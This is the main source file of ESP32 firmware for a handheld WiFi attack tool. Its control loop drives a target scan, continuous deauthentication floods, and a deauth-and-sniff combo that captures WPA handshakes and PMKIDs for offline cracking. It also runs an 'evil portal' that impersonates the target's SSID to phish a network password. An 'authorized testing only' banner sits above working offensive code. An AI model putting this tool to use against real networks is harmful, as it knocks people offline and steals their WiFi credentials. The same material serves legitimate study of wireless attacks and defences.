/*
 * WiFi Security Tool — Marauder-Inspired
 * ═══════════════════════════════════════
 * Board: TTGO T-Display ESP32 (ST7789V 135×240)
 * Features: AP/STA Scan, Deauth, EAPOL/PMKID Capture
 *
 * ⚠ FOR AUTHORIZED SECURITY TESTING ONLY ⚠
 */

#include "esp_wifi.h"
#include <Arduino.h>
#include <TFT_eSPI.h>
#include <WiFi.h>

// Must include pcap_serial.h before wifi_sniffer.h (dependency)
#include "evil_portal.h"
#include "pcap_serial.h"
#include "ui.h"
#include "web_dashboard.h"
#include "wifi_attack.h"
#include "wifi_scan.h"
#include "wifi_sniffer.h"

// ── Global state ───────────────────────────────
TFT_eSPI tft = TFT_eSPI();

// Allocate global arrays defined as extern in headers
AccessPoint apList[MAX_APS];
int apCount = 0;
Station staList[MAX_STATIONS];
int staCount = 0;
int selectedAP = -1;
DeauthStats deauthStats = {0, 0, false, 0};
SnifferStats snifferStats = {0, 0, 0, 0, false, false, {0}, 0, 0};

// ── Hardware ───────────────────────────────────
#define BTN_TOP 0
#define BTN_BOTTOM 35
#define TFT_BL_PIN 4

// ── App state machine ──────────────────────────
enum AppState {
  STATE_SPLASH,
  STATE_MENU,
  STATE_AP_LIST,
  STATE_STA_LIST,
  STATE_DEAUTH_RUNNING,
  STATE_SNIFF_RUNNING,
  STATE_COMBO_RUNNING, // Deauth + Sniff
  STATE_WEB_DASHBOARD,
  STATE_EVIL_PORTAL,
};

AppState appState = STATE_SPLASH;
int menuSelection = 0;
int apScrollPos = 0;
int apListSelection = 0;
int staScrollPos = 0;

// Debounce
unsigned long lastBtnTop = 0;
unsigned long lastBtnBottom = 0;
const unsigned long DEBOUNCE = 200;

// Deauth loop control
unsigned long lastDeauthBurst = 0;
const unsigned long DEAUTH_INTERVAL = 100; // ms between bursts

// UI refresh
unsigned long lastUIRefresh = 0;
const unsigned long UI_REFRESH = 500;

// Station scan timer
unsigned long staScanStart = 0;
const unsigned long STA_SCAN_DURATION = 5000;

// Combo state
bool comboDeauthPhase = true;
unsigned long comboPhaseStart = 0;
const unsigned long COMBO_DEAUTH_DURATION = 3000;

// ── Button helpers ─────────────────────────────
bool btnTopPressed() {
  if (digitalRead(BTN_TOP) == LOW && millis() - lastBtnTop > DEBOUNCE) {
    lastBtnTop = millis();
    return true;
  }
  return false;
}

bool btnBottomPressed() {
  if (digitalRead(BTN_BOTTOM) == LOW && millis() - lastBtnBottom > DEBOUNCE) {
    lastBtnBottom = millis();
    return true;
  }
  return false;
}

// ── Backlight ──────────────────────────────────
void setupBacklight(uint8_t brightness = 200) {
  ledcAttachPin(TFT_BL_PIN, 0);
  ledcSetup(0, 5000, 8);
  ledcWrite(0, brightness);
}

// ── Go back to menu ────────────────────────────
void goToMenu() {
  esp_wifi_set_promiscuous(false);
  deauthStats.running = false;
  snifferStats.running = false;
  appState = STATE_MENU;
  drawMenu(menuSelection, selectedAP);
}

// ── Setup ──────────────────────────────────────
void setup() {
  Serial.begin(115900);
  Serial.println("\n[BOOT] WiFi Security Tool starting...");

  pinMode(BTN_TOP, INPUT_PULLUP);
  pinMode(BTN_BOTTOM, INPUT_PULLUP);

  tft.init();
  tft.setRotation(1); // landscape 240×135
  setupBacklight(200);
  initSprite(); // double-buffer for flicker-free rendering

  // Init WiFi in STA mode
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();

  // Splash screen
  appState = STATE_SPLASH;
  drawSplash();
  Serial.println("[BOOT] Splash displayed");
}

// ── Loop ───────────────────────────────────────
void loop() {
  unsigned long now = millis();

  switch (appState) {

  // ── SPLASH ─────────────────────────────────
  case STATE_SPLASH:
    if (btnTopPressed() || btnBottomPressed() || now > 4000) {
      appState = STATE_MENU;
      drawMenu(menuSelection, selectedAP);
    }
    break;

  // ── MENU ───────────────────────────────────
  case STATE_MENU:
    if (btnTopPressed()) {
      menuSelection = (menuSelection + 1) % MENU_COUNT;
      drawMenu(menuSelection, selectedAP);
    }
    if (btnBottomPressed()) {
      switch ((MenuItem)menuSelection) {
      case MENU_SCAN_AP:
        scanAccessPoints();
        apScrollPos = 0;
        apListSelection = 0;
        appState = STATE_AP_LIST;
        drawAPList(apScrollPos, apListSelection);
        break;

      case MENU_SCAN_STA: {
        // If we have a selected AP, scan its channel
        uint8_t ch = (selectedAP >= 0) ? apList[selectedAP].channel : 0;
        startStationScan(ch);
        staScanStart = now;
        staScrollPos = 0;
        appState = STATE_STA_LIST;
        drawSTAList(staScrollPos);
        break;
      }

      case MENU_DEAUTH:
        if (selectedAP < 0 || selectedAP >= apCount) {
          // Need to select an AP first
          scanAccessPoints();
          apScrollPos = 0;
          apListSelection = 0;
          appState = STATE_AP_LIST;
          drawAPList(apScrollPos, apListSelection);
        } else {
          // Start deauth
          deauthStats.packetsSent = 0;
          deauthStats.running = true;
          deauthStats.startTime = now;
          WiFi.mode(WIFI_STA);
          esp_wifi_set_promiscuous(true);
          appState = STATE_DEAUTH_RUNNING;
          drawDeauthStatus(apList[selectedAP].ssid.c_str(),
                           deauthStats.packetsSent, true);
        }
        break;

      case MENU_SNIFF:
        if (selectedAP < 0 || selectedAP >= apCount) {
          scanAccessPoints();
          apScrollPos = 0;
          apListSelection = 0;
          appState = STATE_AP_LIST;
          drawAPList(apScrollPos, apListSelection);
        } else {
          startSniffer(apList[selectedAP].bssid, apList[selectedAP].channel);
          appState = STATE_SNIFF_RUNNING;
          drawSnifferStatus(apList[selectedAP].ssid.c_str(), 0, 0, 0, false,
                            true);
        }
        break;

      case MENU_PMKID_COMBO:
        if (selectedAP < 0 || selectedAP >= apCount) {
          scanAccessPoints();
          apScrollPos = 0;
          apListSelection = 0;
          appState = STATE_AP_LIST;
          drawAPList(apScrollPos, apListSelection);
        } else {
          // Start combo: sniffer + deauth
          startSniffer(apList[selectedAP].bssid, apList[selectedAP].channel);
          deauthStats.packetsSent = 0;
          deauthStats.running = true;
          deauthStats.startTime = now;
          comboDeauthPhase = true;
          comboPhaseStart = now;
          appState = STATE_COMBO_RUNNING;
        }
        break;

      case MENU_PCAP_DUMP:
        pcapDumpToSerial();
        drawMessage("PCAP DUMPED",
                    (String(pcapGetCount()) + " packets").c_str(),
                    (String(pcapGetSize()) + " bytes").c_str(), C_GREEN);
        delay(2000);
        drawMenu(menuSelection, selectedAP);
        break;

      case MENU_WEB_DASHBOARD:
        startWebDashboard();
        appState = STATE_WEB_DASHBOARD;
        drawWebDashboardStatus();
        break;

      case MENU_EVIL_PORTAL:
        if (selectedAP >= 0 && selectedAP < apCount) {
          startEvilPortal(apList[selectedAP].ssid.c_str());
        } else {
          startEvilPortal(
              "Free WiFi"); // Generic fallback if no target selected
        }
        appState = STATE_EVIL_PORTAL;
        drawEvilPortalStatus(hasCapturedPassword, capturedPassword);
        break;

      default:
        break;
      }
    }
    break;

  // ── AP LIST ────────────────────────────────
  case STATE_AP_LIST:
    if (btnTopPressed()) {
      apListSelection = (apListSelection + 1) % max(1, apCount);
      // Scroll if needed
      if (apListSelection >= apScrollPos + 6) {
        apScrollPos = apListSelection - 5;
      } else if (apListSelection < apScrollPos) {
        apScrollPos = apListSelection;
      }
      drawAPList(apScrollPos, apListSelection);
    }
    if (btnBottomPressed()) {
      if (apCount > 0) {
        selectedAP = apListSelection;
        Serial.printf("[SEL] AP: %s ch:%d\n", apList[selectedAP].ssid.c_str(),
                      apList[selectedAP].channel);

        // Flash confirmation via sprite
        drawMessage("TARGET SET", apList[selectedAP].ssid.c_str(),
                    ("Ch " + String(apList[selectedAP].channel) + " | " +
                     macToString(apList[selectedAP].bssid))
                        .c_str(),
                    C_GREEN);
        delay(1500);
        goToMenu();
      }
    }
    break;

  // ── STATION LIST ───────────────────────────
  case STATE_STA_LIST:
    if (btnTopPressed() && staCount > 7) {
      staScrollPos = (staScrollPos + 1) % max(1, staCount);
      drawSTAList(staScrollPos);
    }
    if (btnBottomPressed()) {
      stopStationScan();
      goToMenu();
    }
    // Auto-refresh display
    if (now - lastUIRefresh > 1000) {
      drawSTAList(staScrollPos);
      lastUIRefresh = now;
    }
    // Stop after duration
    if (now - staScanStart > STA_SCAN_DURATION) {
      stopStationScan();
      drawSTAList(staScrollPos); // final update
    }
    break;

  // ── DEAUTH RUNNING ─────────────────────────
  case STATE_DEAUTH_RUNNING:
    if (deauthStats.running) {
      if (now - lastDeauthBurst > DEAUTH_INTERVAL) {
        uint32_t sent =
            deauthBurst(apList[selectedAP].bssid, apList[selectedAP].channel,
                        5 // packets per burst
            );
        deauthStats.packetsSent += sent;
        lastDeauthBurst = now;
      }

      // Refresh UI
      if (now - lastUIRefresh > UI_REFRESH) {
        drawDeauthStatus(apList[selectedAP].ssid.c_str(),
                         deauthStats.packetsSent, true);
        lastUIRefresh = now;
      }
    }

    // Stop button
    if (btnBottomPressed() || btnTopPressed()) {
      deauthStats.running = false;
      esp_wifi_set_promiscuous(false);
      drawDeauthStatus(apList[selectedAP].ssid.c_str(), deauthStats.packetsSent,
                       false);
      delay(1500);
      goToMenu();
    }
    break;

  // ── SNIFFER RUNNING ────────────────────────
  case STATE_SNIFF_RUNNING:
    if (now - lastUIRefresh > UI_REFRESH) {
      drawSnifferStatus(apList[selectedAP].ssid.c_str(),
                        snifferStats.eapolPackets, snifferStats.pmkidPackets,
                        snifferStats.totalPackets,
                        snifferStats.handshakeCaptured, snifferStats.running);
      lastUIRefresh = now;
    }

    // TOP button = dump PCAP
    if (btnTopPressed()) {
      pcapDumpToSerial();
    }

    // BTN = stop
    if (btnBottomPressed()) {
      stopSniffer();
      drawSnifferStatus(apList[selectedAP].ssid.c_str(),
                        snifferStats.eapolPackets, snifferStats.pmkidPackets,
                        snifferStats.totalPackets,
                        snifferStats.handshakeCaptured, false);
      delay(1500);
      goToMenu();
    }
    break;

  // ── COMBO: Deauth + Sniff ──────────────────
  case STATE_COMBO_RUNNING: {
    // Alternating phases: deauth burst → listen → deauth → listen...
    if (comboDeauthPhase) {
      // Send deauth bursts
      if (now - lastDeauthBurst > DEAUTH_INTERVAL) {
        uint32_t sent = deauthBurst(apList[selectedAP].bssid,
                                    apList[selectedAP].channel, 3);
        deauthStats.packetsSent += sent;
        lastDeauthBurst = now;
      }

      // Switch to listen after COMBO_DEAUTH_DURATION
      if (now - comboPhaseStart > COMBO_DEAUTH_DURATION) {
        comboDeauthPhase = false;
        comboPhaseStart = now;
        // Re-enable sniffer after deauth
        esp_wifi_set_promiscuous_rx_cb(nullptr);
        startSniffer(apList[selectedAP].bssid, apList[selectedAP].channel);
      }
    } else {
      // Listen phase — sniffer is active
      // Switch back to deauth after listening
      if (now - comboPhaseStart > COMBO_DEAUTH_DURATION * 2) {
        comboDeauthPhase = true;
        comboPhaseStart = now;
      }
    }

    // UI refresh
    if (now - lastUIRefresh > UI_REFRESH) {
      drawSnifferStatus(apList[selectedAP].ssid.c_str(),
                        snifferStats.eapolPackets, snifferStats.pmkidPackets,
                        snifferStats.totalPackets,
                        snifferStats.handshakeCaptured, true);

      // Deauth count is already shown by drawSnifferStatus header area
      // (sprite-based, no extra direct tft draw needed)

      lastUIRefresh = now;
    }

    // Stop if handshake captured or button pressed
    if (snifferStats.handshakeCaptured) {
      deauthStats.running = false;
      stopSniffer();
      drawMessage("HANDSHAKE", "CAPTURED!",
                  ("EAPOL: " + String(snifferStats.eapolPackets) +
                   "  PMKID: " + String(snifferStats.pmkidPackets))
                      .c_str(),
                  C_GREEN);
      delay(3000);
      goToMenu();
    }

    if (btnBottomPressed()) {
      deauthStats.running = false;
      stopSniffer();
      delay(500);
      goToMenu();
    }
    break;
  }

  // ── WEB DASHBOARD ──────────────────────────
  case STATE_WEB_DASHBOARD:
    server.handleClient(); // keep answering http requests

    // Any button exits dashboard
    if (btnBottomPressed() || btnTopPressed()) {
      stopWebDashboard();
      goToMenu();
    }
    break;

  // ── EVIL PORTAL ────────────────────────────
  case STATE_EVIL_PORTAL:
    dnsServer.processNextRequest();
    portalServer.handleClient(); // handles captive redirects & phishing POST

    // If we just noticed a password via interrupt/hasCapturedPassword switch,
    // refresh UI
    if (hasCapturedPassword) {
      // NOTE: UI is explicitly drawn in handlePasswordSubmit. We don't spam
      // draw it here to save CPU but maybe if we needed animation we would.
    }

    // Any button exits portal
    if (btnBottomPressed() || btnTopPressed()) {
      stopEvilPortal();
      goToMenu();
    }
    break;

  } // end switch

  delay(10); // yield
}
